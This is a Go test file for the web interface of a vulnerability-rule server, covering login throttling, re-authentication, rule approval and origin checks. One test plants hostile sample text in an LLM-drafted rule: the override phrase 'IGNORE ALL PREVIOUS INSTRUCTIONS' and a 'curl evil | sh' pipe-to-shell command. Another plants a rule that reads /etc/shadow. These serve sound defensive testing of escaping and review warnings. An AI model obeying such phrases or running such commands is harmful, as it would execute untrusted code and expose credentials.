package web

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/DonSosiska/holealign/internal/model"
	"github.com/DonSosiska/holealign/internal/server/config"
)

type httptestResp = httptest.ResponseRecorder

func newRec() *httptest.ResponseRecorder { return httptest.NewRecorder() }

// newReq builds a request with the given Host; form may be nil.
func newReq(method, path string, form url.Values, host string) *http.Request {
	var body io.Reader
	if form != nil {
		body = strings.NewReader(form.Encode())
	}
	r := httptest.NewRequest(method, path, body)
	r.RemoteAddr = "192.0.2.1:1234"
	r.Host = host
	if form != nil {
		r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	return r
}

// sleepRec replaces the login delay sleeper: it records the requested waits and returns at once.
type sleepRec struct {
	mu sync.Mutex
	d  []time.Duration
}

func (s *sleepRec) sleep(_ context.Context, d time.Duration) error {
	s.mu.Lock()
	s.d = append(s.d, d)
	s.mu.Unlock()
	return nil
}

func (s *sleepRec) total() (n int, max time.Duration) {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, d := range s.d {
		max = maxDur(max, d)
	}
	return len(s.d), max
}

func maxDur(a, b time.Duration) time.Duration {
	if a > b {
		return a
	}
	return b
}

// loginEnv returns an env whose client IP is taken from the X-Test-IP header and whose delay
// sleeper is recorded instead of slept.
func loginEnv(t *testing.T) (*env, *sleepRec) {
	t.Helper()
	e := newEnv(t, true)
	e.addUser("admin", "correct-horse-battery")
	rec := &sleepRec{}
	e.srv.sleep = rec.sleep
	e.srv.ipOf = func(r *http.Request) string { return r.Header.Get("X-Test-IP") }
	return e, rec
}

func (e *env) login(ip, user, pw string, cookies ...*http.Cookie) *httptestResp {
	lc := &http.Cookie{Name: loginCSRFName, Value: "tok"}
	r := newReq("POST", "/login", url.Values{"username": {user}, "password": {pw}, "csrf": {"tok"}}, e.srv.pubURL.Host)
	r.Header.Set("X-Test-IP", ip)
	r.AddCookie(lc)
	for _, c := range cookies {
		r.AddCookie(c)
	}
	w := newRec()
	e.mux.ServeHTTP(w, r)
	return w
}

func TestWrongLoginsFromManyIPsDoNotLockOutTheAdmin(t *testing.T) {
	e, rec := loginEnv(t)
	for i := 0; i < 10; i++ {
		if w := e.login(fmt.Sprintf("203.0.113.%d", i+1), "admin", "wrong-password"); w.Code != 401 {
			t.Fatalf("attempt %d: %d", i, w.Code)
		}
	}
	w := e.login("198.51.100.77", "admin", "correct-horse-battery")
	if w.Code != 303 {
		t.Fatalf("correct password from a fresh IP refused: %d", w.Code)
	}
	n, max := rec.total()
	if n == 0 {
		t.Fatal("no progressive delay applied after 10 failures")
	}
	if max > 4*nameMaxDelay {
		t.Fatalf("delay not bounded: %v", max)
	}
}

func TestDelayGrowsAndIsCapped(t *testing.T) {
	now := time.Now()
	g := newNameGate(func() time.Time { return now })
	for i := 0; i < nameDelayAfter; i++ {
		g.fail("v")
	}
	var last time.Duration
	for k := 0; k < 8; k++ {
		w, ok := g.enter("v")
		if !ok {
			t.Fatal("enter refused")
		}
		g.exit("v")
		now = now.Add(time.Minute) // slot free again, failures stay inside the window
		g.fail("v")
		d := nameBaseDelay << uint(k)
		if d > nameMaxDelay {
			d = nameMaxDelay
		}
		if w != d {
			t.Fatalf("k=%d: wait %v want %v", k, w, d)
		}
		if w < last {
			t.Fatalf("delay shrank: %v < %v", w, last)
		}
		last = w
	}
	if last != nameMaxDelay {
		t.Fatalf("not capped: %v", last)
	}
}

func TestNameGateWaiterBoundAndSerialisation(t *testing.T) {
	now := time.Now()
	g := newNameGate(func() time.Time { return now })
	for i := 0; i < nameDelayAfter; i++ {
		g.fail("v")
	}
	var prev time.Duration
	for i := 0; i < nameMaxWaiters; i++ {
		w, ok := g.enter("v")
		if !ok || w <= prev {
			t.Fatalf("waiter %d: ok=%v wait=%v prev=%v (slots must be serialised)", i, ok, w, prev)
		}
		prev = w
	}
	if _, ok := g.enter("v"); ok {
		t.Fatal("more than nameMaxWaiters concurrent delayed attempts allowed")
	}
	g.exit("v")
	if _, ok := g.enter("v"); !ok {
		t.Fatal("slot not released")
	}
}

func TestKnownDeviceAndSessionIPSkipDelay(t *testing.T) {
	e, rec := loginEnv(t)
	w := e.login("192.0.2.10", "admin", "correct-horse-battery")
	if w.Code != 303 {
		t.Fatalf("login %d", w.Code)
	}
	var dev, sess *http.Cookie
	for _, c := range w.Result().Cookies() {
		switch c.Name {
		case deviceCookie:
			dev = c
		case cookieName:
			sess = c
		}
	}
	if dev == nil || len(dev.Value) != 64 || !dev.HttpOnly || dev.MaxAge != int(deviceTTL/time.Second) {
		t.Fatalf("device cookie: %+v", dev)
	}
	if e.srv.devices.m["admin"][dev.Value] != (time.Time{}) {
		t.Fatal("device token stored in clear")
	}
	for i := 0; i < 8; i++ {
		e.login(fmt.Sprintf("203.0.113.%d", i+1), "admin", "nope")
	}
	n0, _ := rec.total()
	if w := e.login("198.51.100.5", "admin", "correct-horse-battery", dev); w.Code != 303 {
		t.Fatalf("device login %d", w.Code)
	}
	if n, _ := rec.total(); n != n0 {
		t.Fatal("known device was delayed")
	}
	for i := 0; i < 8; i++ { // the successful login cleared the failures; build them up again
		e.login(fmt.Sprintf("203.0.113.%d", i+20), "admin", "nope")
	}
	n0, _ = rec.total()
	if w := e.login("198.51.100.6", "admin", "correct-horse-battery"); w.Code != 303 {
		t.Fatal("login without device failed")
	}
	if n, _ := rec.total(); n != n0+1 {
		t.Fatal("unknown device was not delayed")
	}
	// an IP with a valid session for the user is trusted too
	r := newReq("GET", "/hosts", nil, e.srv.pubURL.Host)
	r.Header.Set("X-Test-IP", "192.0.2.99")
	r.AddCookie(e.session("admin"))
	e.mux.ServeHTTP(newRec(), r)
	_ = sess
	n1, _ := rec.total()
	if w := e.login("192.0.2.99", "admin", "correct-horse-battery"); w.Code != 303 {
		t.Fatal("session-IP login failed")
	}
	if n, _ := rec.total(); n != n1 {
		t.Fatal("IP with a valid session was delayed")
	}
	// a forged device value does not help
	e.srv.names.fail("admin")
	if e.srv.trustedAttempt(newReq("POST", "/login", nil, "x"), "192.0.2.200", "admin") {
		t.Fatal("anonymous request trusted")
	}
}

func TestReauthIndependentOfLoginFailures(t *testing.T) {
	e, _ := loginEnv(t)
	c := e.session("admin")
	// many failed logins from the admin's own IP and from everywhere else
	for i := 0; i < 30; i++ {
		e.login("192.0.2.1", "admin", "wrong")
		e.login(fmt.Sprintf("203.0.113.%d", i%250+1), "admin", "wrong")
	}
	e.srv.ipOf = func(*http.Request) string { return "192.0.2.1" }
	if w := e.post("/settings/tokens", url.Values{"name": {"t1"}, "current_password": {"correct-horse-battery"}}, c); w.Code != 200 {
		t.Fatalf("re-auth blocked by login failures: %d", w.Code)
	}
}

func TestFiveFailedReauthsLogOutTheSession(t *testing.T) {
	e, _ := loginEnv(t)
	c := e.session("admin")
	other := e.session("admin")
	for i := 0; i < maxReauthFailures; i++ {
		w := e.post("/settings/tokens", url.Values{"name": {"t1"}, "current_password": {"wrong"}}, c)
		if w.Code != 403 {
			t.Fatalf("failure %d: %d", i, w.Code)
		}
	}
	if w := e.do("GET", "/hosts", nil, c); w.Code != http.StatusSeeOther {
		t.Fatalf("session still valid after %d failed re-auths: %d", maxReauthFailures, w.Code)
	}
	if w := e.do("GET", "/hosts", nil, other); w.Code != 200 {
		t.Fatalf("other session of the same user affected: %d", w.Code)
	}
	// and the account itself is not locked
	if w := e.login("203.0.113.9", "admin", "correct-horse-battery"); w.Code != 303 {
		t.Fatalf("login after re-auth failures: %d", w.Code)
	}
	// a correct password resets the count
	c2 := e.session("admin")
	for i := 0; i < maxReauthFailures-1; i++ {
		e.post("/settings/tokens", url.Values{"name": {"x"}, "current_password": {"wrong"}}, c2)
	}
	if w := e.post("/settings/tokens", url.Values{"name": {"x1"}, "current_password": {"correct-horse-battery"}}, c2); w.Code != 200 {
		t.Fatalf("correct re-auth: %d", w.Code)
	}
	for i := 0; i < maxReauthFailures-1; i++ {
		e.post("/settings/tokens", url.Values{"name": {"x"}, "current_password": {"wrong"}}, c2)
	}
	if w := e.do("GET", "/hosts", nil, c2); w.Code != 200 {
		t.Fatal("count was not reset by a successful re-auth")
	}
}

func TestLongOrOddUsernameRejectedBeforeLimiters(t *testing.T) {
	e, logs := logEnvIP(t)
	for _, u := range []string{strings.Repeat("a", 65), strings.Repeat("a", 5000), "bad name", "x\ny", "ünï", ""} {
		w := e.login("203.0.113.1", u, "pw")
		if w.Code != 401 || !strings.Contains(w.Body.String(), "Invalid username or password.") {
			t.Fatalf("user %.10q: %d", u, w.Code)
		}
	}
	if n := len(e.srv.limIP.items) + len(e.srv.lim.items) + len(e.srv.names.m); n != 0 {
		t.Fatalf("limiter state created for rejected usernames: %d", n)
	}
	if strings.Contains(logs.String(), "aaaaaaaa") {
		t.Fatal("rejected username reached the log")
	}
	// keys / log values of accepted names are bounded
	if k := userKey(strings.Repeat("b", 500)); len(k) > 40 {
		t.Fatalf("long user key not hashed: %d", len(k))
	}
	if l := trunc64(strings.Repeat("c", 500)); len(l) != 64 {
		t.Fatalf("log value not truncated: %d", len(l))
	}
}

func logEnvIP(t *testing.T) (*env, *lockedBuf) {
	e, logs := logEnv(t, "http://holealign.test")
	e.srv.ipOf = func(r *http.Request) string { return r.Header.Get("X-Test-IP") }
	return e, logs
}

func TestIPv6KeyIsSlash64(t *testing.T) {
	a, b, c := ipKey("2001:db8:1:2::1"), ipKey("2001:db8:1:2:ffff::9"), ipKey("2001:db8:1:3::1")
	if a != b || a == c {
		t.Fatalf("keys: %s %s %s", a, b, c)
	}
	if ipKey("192.0.2.5") != "192.0.2.5" || ipKey("::ffff:192.0.2.5") != "192.0.2.5" {
		t.Fatal("ipv4 key changed")
	}
	// the (ip,user) limiter follows the /64
	e, _ := loginEnv(t)
	for i := 0; i < maxFailures; i++ {
		e.login(fmt.Sprintf("2001:db8:1:2::%x", i+1), "admin", "wrong")
	}
	if w := e.login("2001:db8:1:2:aaaa::1", "admin", "correct-horse-battery"); w.Code != 429 {
		t.Fatalf("same /64 not limited: %d", w.Code)
	}
}

func TestInflightAttemptsCounted(t *testing.T) {
	now := time.Now()
	l := newLimiterCfg(func() time.Time { return now }, 3, time.Minute, 0, 100)
	for i := 0; i < 3; i++ {
		if !l.acquire("k") {
			t.Fatalf("acquire %d refused", i)
		}
	}
	if l.acquire("k") {
		t.Fatal("parallel attempts beyond the maximum were allowed")
	}
	l.release("k")
	if !l.acquire("k") {
		t.Fatal("release did not free a slot")
	}
}

func TestBcryptQueueBounded(t *testing.T) {
	e := newEnv(t, true)
	for i := 0; i < cap(e.srv.bcryptSem); i++ {
		e.srv.bcryptSem <- struct{}{}
	}
	e.srv.bcryptWaiting.Store(bcryptMaxQueue)
	start := time.Now()
	if _, err := e.srv.checkPassword(context.Background(), dummyHash, "x"); err != errBusy {
		t.Fatalf("want errBusy, got %v", err)
	}
	if time.Since(start) > time.Second {
		t.Fatal("full queue must fail fast")
	}
}

// --- rules ----------------------------------------------------------------------------------

func TestRuleActionsNeedPassword(t *testing.T) {
	e := newEnv(t, true)
	c := e.session("admin")
	for _, tc := range []struct {
		path string
		form url.Values
	}{
		{"/rules/CVE-2024-1/approve", url.Values{}},
		{"/rules/CVE-2024-1/reject", url.Values{}},
		{"/rules/CVE-2024-1/edit", url.Values{"yaml": {draftYAML}}},
		{"/settings/matrix", url.Values{"routes": {"prod = !a:b"}}},
	} {
		for _, cur := range []string{"", "wrong-password"} {
			f := url.Values{}
			for k, v := range tc.form {
				f[k] = v
			}
			if cur != "" {
				f.Set("current_password", cur)
			}
			if w := e.postNoAuth(tc.path, f, e.session("admin")); w.Code != 403 {
				t.Errorf("%s cur=%q: %d", tc.path, cur, w.Code)
			}
		}
	}
	_ = c
	if _, err := e.st.GetRule(context.Background(), "CVE-2024-1"); err == nil {
		t.Error("a rule was stored without re-auth")
	}
	if _, err := e.st.GetSetting(context.Background(), matrixSettingKey); err == nil {
		t.Error("routes saved without re-auth")
	}
}

func TestStaleRuleVersionRefused(t *testing.T) {
	e := newEnv(t, true)
	c := e.session("admin")
	old := ruleVersion(e.rules.rules[0])
	// the rule changes after the admin opened the page (e.g. the LLM redrafted it)
	e.rules.mu.Lock()
	e.rules.rules[0].FactRequests = []model.FactRequest{{Name: "file.match:x", Collector: "file.match", Params: map[string]string{"path": "/etc/shadow", "pattern": "."}}}
	e.rules.mu.Unlock()
	for _, p := range []string{"/rules/CVE-2024-1/approve", "/rules/CVE-2024-1/reject", "/rules/CVE-2024-1/edit"} {
		f := url.Values{"rule_version": {old}, "yaml": {draftYAML}}
		if w := e.post(p, f, c); w.Code != 409 || !strings.Contains(w.Body.String(), "Reload") {
			t.Errorf("%s with stale version: %d", p, w.Code)
		}
		w := e.do("POST", p, url.Values{"yaml": {draftYAML}, "current_password": {"pw-long-enough"}, "csrf": {e.csrf(c)}}, c)
		if w.Code != 409 {
			t.Errorf("%s without version: %d", p, w.Code)
		}
	}
	if _, err := e.st.GetRule(context.Background(), "CVE-2024-1"); err == nil {
		t.Error("stale form changed the rule")
	}
	// the current version works
	cur := ruleVersion(e.rules.rules[0])
	if w := e.post("/rules/CVE-2024-1/approve", url.Values{"rule_version": {cur}}, c); w.Code != 303 {
		t.Fatalf("approve with current version: %d", w.Code)
	}
}

func TestYAMLEditCannotApprove(t *testing.T) {
	e := newEnv(t, true)
	c := e.session("admin")
	y := strings.Replace(draftYAML, "status: draft", "status: reviewed", 1)
	w := e.post("/rules/CVE-2024-1/edit", url.Values{"yaml": {y}}, c)
	if w.Code != 422 || !strings.Contains(w.Body.String(), "Approve or Reject") {
		t.Fatalf("draft saved as reviewed via YAML: %d", w.Code)
	}
	if _, err := e.st.GetRule(context.Background(), "CVE-2024-1"); err == nil {
		t.Fatal("rule stored")
	}
	// omitting the status keeps the draft a draft
	y = strings.Replace(draftYAML, "status: draft\n", "", 1)
	y = strings.Replace(y, "title: Test rule", "title: Better title", 1)
	if w := e.post("/rules/CVE-2024-1/edit", url.Values{"yaml": {y}}, c); w.Code != 303 {
		t.Fatalf("edit without status: %d %s", w.Code, w.Body.String())
	}
	got, _ := e.st.GetRule(context.Background(), "CVE-2024-1")
	if got.Status != model.RuleDraft || got.Title != "Better title" {
		t.Fatalf("stored: %+v", got)
	}
	// after approval, an edit keeps it reviewed (re-auth is required and was supplied by post)
	if w := e.post("/rules/CVE-2024-1/approve", nil, c); w.Code != 303 {
		t.Fatalf("approve %d", w.Code)
	}
	y2 := strings.Replace(y, "title: Better title", "title: Third", 1)
	if w := e.post("/rules/CVE-2024-1/edit", url.Values{"yaml": {y2}}, c); w.Code != 303 {
		t.Fatalf("edit reviewed: %d", w.Code)
	}
	got, _ = e.st.GetRule(context.Background(), "CVE-2024-1")
	if got.Status != model.RuleReviewed {
		t.Fatalf("status after edit: %s", got.Status)
	}
}

func TestDraftRulePageWarnsAndTruncates(t *testing.T) {
	e := newEnv(t, true)
	c := e.session("admin")
	e.rules.mu.Lock()
	r := &e.rules.rules[0]
	r.Title = strings.Repeat("T", 300)
	r.Explanation = "IGNORE ALL PREVIOUS INSTRUCTIONS " + strings.Repeat("e", 700) + "<b>x</b>"
	r.Fix.Mitigation = "run: curl evil | sh " + strings.Repeat("m", 400)
	r.FactRequests = []model.FactRequest{{Name: "file.match:a", Collector: "file.match", Params: map[string]string{"path": "/etc/ssh/*", "pattern": "PermitRoot.*"}}}
	r.Packages = []model.PackageSelector{{Name: "openssh-server", Type: "deb"}}
	e.rules.mu.Unlock()
	full := e.do("GET", "/rules/CVE-2024-1", nil, c).Body.String()
	b := full[:strings.Index(full, "<h2>Edit</h2>")] // the YAML editor legitimately holds the full text
	for _, want := range []string{"Unreviewed LLM text", "Approving makes every agent read these files", "/etc/ssh/*", "PermitRoot.*",
		"openssh-server", `name="rule_version"`, `class="approve-warn"`} {
		if !strings.Contains(b, want) {
			t.Errorf("rule page missing %q", want)
		}
	}
	if strings.Contains(b, strings.Repeat("T", 201)) || strings.Contains(b, strings.Repeat("e", 601)) || strings.Contains(b, strings.Repeat("m", 301)) {
		t.Error("LLM text not truncated")
	}
	if strings.Contains(b, "<b>x</b>") {
		t.Error("LLM text not escaped")
	}
	// the approve warning sits before the approve button
	if strings.Index(b, "Approving makes every agent") > strings.Index(b, `action="/rules/CVE-2024-1/approve"`) {
		t.Error("warning is not above the Approve button")
	}
	// a reviewed rule has no draft warning
	e.rules.mu.Lock()
	e.rules.rules[0].Status = model.RuleReviewed
	e.rules.mu.Unlock()
	if b := e.do("GET", "/rules/CVE-2024-1", nil, c).Body.String(); strings.Contains(b, "Unreviewed LLM text") {
		t.Error("reviewed rule shown as unreviewed")
	}
}

// --- origin / host ----------------------------------------------------------------------------

func TestOriginAndHostPinnedToPublicURL(t *testing.T) {
	e, _ := logEnv(t, "https://holealign.example.com")
	c := e.session("admin")
	c.Name = e.srv.sessName
	f := func() url.Values {
		return url.Values{"routes": {"prod = !a:b"}, "csrf": {e.csrf(c)}, "current_password": {"pw-long-enough"}}
	}
	post := func(origin, host string) int {
		r := newReq("POST", "/settings/matrix", f(), host)
		r.AddCookie(c)
		if origin != "" {
			r.Header.Set("Origin", origin)
		}
		w := newRec()
		e.mux.ServeHTTP(w, r)
		return w.Code
	}
	if got := post("https://holealign.example.com", "holealign.example.com"); got != 303 {
		t.Fatalf("legit: %d", got)
	}
	if got := post("https://holealign.example.com:443", "holealign.example.com:443"); got != 303 {
		t.Fatalf("explicit default port: %d", got)
	}
	if got := post("https://evil.example", "holealign.example.com"); got != 403 {
		t.Errorf("foreign origin: %d", got)
	}
	if got := post("http://holealign.example.com", "holealign.example.com"); got != 403 {
		t.Errorf("wrong scheme: %d", got)
	}
	// Origin equal to a spoofed Host: still rejected, the Host itself is wrong
	if got := post("https://evil.example", "evil.example"); got != 421 {
		t.Errorf("rebinding Host: %d", got)
	}
	r := newReq("GET", "/login", nil, "evil.example")
	w := newRec()
	e.mux.ServeHTTP(w, r)
	if w.Code != 421 {
		t.Errorf("GET login with foreign Host: %d", w.Code)
	}
	// loopback / empty public URL falls back to Host comparison
	e2 := newEnv(t, true)
	e2.srv.cfg.PublicURL = ""
	e2.srv.pubURL = nil
	c2 := e2.session("admin")
	g := url.Values{"routes": {"prod = !a:b"}, "csrf": {e2.csrf(c2)}, "current_password": {"pw-long-enough"}}
	if w := e2.do("POST", "/settings/matrix", g, c2, "Origin", "http://example.com"); w.Code != 303 {
		t.Errorf("dev same host: %d", w.Code)
	}
	if w := e2.do("POST", "/settings/matrix", g, c2, "Origin", "http://evil.example"); w.Code != 403 {
		t.Errorf("dev foreign origin: %d", w.Code)
	}
}

// --- matrix routes caps -------------------------------------------------------------------------

// testValid is the production destination check with all channels configured.
func testValid(d string) error {
	c := config.Default()
	c.Matrix.Homeserver = "https://m"
	c.Slack.TokenEnv, c.Telegram.BotTokenEnv = "HOLEALIGN_SLACK_TOKEN", "HOLEALIGN_TELEGRAM_TOKEN"
	return c.ValidateDestination(d)
}

func TestMatrixRoutesCaps(t *testing.T) {
	if _, err := parseRoutes("prod = "+strings.Repeat("!a:b,", 4000), testValid); err == nil {
		t.Error("16 KiB cap not enforced")
	}
	var b strings.Builder
	for i := 0; i < maxRoutes+1; i++ {
		fmt.Fprintf(&b, "l%d = !r:s\n", i)
	}
	if _, err := parseRoutes(b.String(), testValid); err == nil {
		t.Error("route count cap not enforced")
	}
	rooms := make([]string, maxRoomsPerRoute+1)
	for i := range rooms {
		rooms[i] = fmt.Sprintf("!r%d:s", i)
	}
	if _, err := parseRoutes("prod = "+strings.Join(rooms, ", "), testValid); err == nil {
		t.Error("rooms-per-route cap not enforced")
	}
	for _, bad := range []string{"Prod = !a:b", "pr od = !a:b", "<x> = !a:b", strings.Repeat("a", 80) + " = !a:b"} {
		if _, err := parseRoutes(bad, testValid); err == nil {
			t.Errorf("label %q accepted", bad)
		}
	}
	if rs, err := parseRoutes("prod = !a:b, !c:d\n# c\nweb.eu = !x:y, slack:C0123456789", testValid); err != nil || len(rs) != 2 {
		t.Errorf("valid routes: %v %v", rs, err)
	}
}

// --- notify banner ---------------------------------------------------------------------------------

func TestDashboardShowsNotifyProblems(t *testing.T) {
	e := newEnv(t, true)
	c := e.session("admin")
	now := time.Now()
	ps := []notifyProblem{
		{At: now.Add(-time.Hour), Room: "!old:s", Status: 403, Kind: "exploitable", Permanent: true},
		{At: now.Add(-48 * time.Hour), Room: "!stale:s", Status: 403, Kind: "exploitable", Permanent: true},
		{At: now.Add(-time.Minute), Room: "!ops:s", Status: 403, Kind: "agent_silent", Permanent: true},
	}
	raw, _ := json.Marshal(ps)
	if err := e.st.KVSet(context.Background(), kvNotifyErrors, string(raw), now); err != nil {
		t.Fatal(err)
	}
	b := e.do("GET", "/", nil, c).Body.String()
	if !strings.Contains(b, "alerts are not being delivered to !ops:s: 403") || !strings.Contains(b, "!old:s") {
		t.Errorf("banner missing: %s", b)
	}
	if strings.Contains(b, "!stale:s") {
		t.Error("old problem still shown")
	}
}
